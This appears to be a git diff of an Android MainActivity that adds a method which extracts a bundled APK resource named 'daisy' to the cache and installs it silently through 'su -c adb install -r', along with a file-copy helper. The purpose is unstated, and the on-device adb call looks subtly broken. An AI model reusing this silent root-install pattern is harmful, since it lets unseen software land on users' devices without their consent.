@@ -1,5 +1,7 @@
 package com.ally.activity.mainActivity;
 
+import static com.google.firebase.crashlytics.internal.proto.CodedOutputStream.DEFAULT_BUFFER_SIZE;
+
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.AlertDialog;
@@ -121,6 +123,45 @@ public class MainActivity extends BaseActivity implements CallBack, View.OnClick
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+
+    }
+
+    private void installDefaultApk() {
+        InputStream ins = getResources().openRawResource(
+                getResources().getIdentifier("daisy",
+                        "raw", getPackageName()));
+        File file=new File(getExternalCacheDir()+"/in");
+        try {
+            copyInputStreamToFile(ins, file);
+            try {
+                String adbCommand = "adb install -r " + file.getAbsolutePath();
+                String[] commands = new String[]{"su", "-c", adbCommand};
+                Process process = Runtime.getRuntime().exec(commands);
+                 process.waitFor();
+            } catch (Exception e) {
+                //Handle Exception
+                e.printStackTrace();
+            }
+
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
+
+
+    }
+    private static void copyInputStreamToFile(InputStream inputStream, File file)
+            throws IOException {
+
+        // append = false
+        try (FileOutputStream outputStream = new FileOutputStream(file, false)) {
+            int read;
+            byte[] bytes = new byte[DEFAULT_BUFFER_SIZE];
+            while ((read = inputStream.read(bytes)) != -1) {
+                outputStream.write(bytes, 0, read);
+            }
+        }
 
     }
 
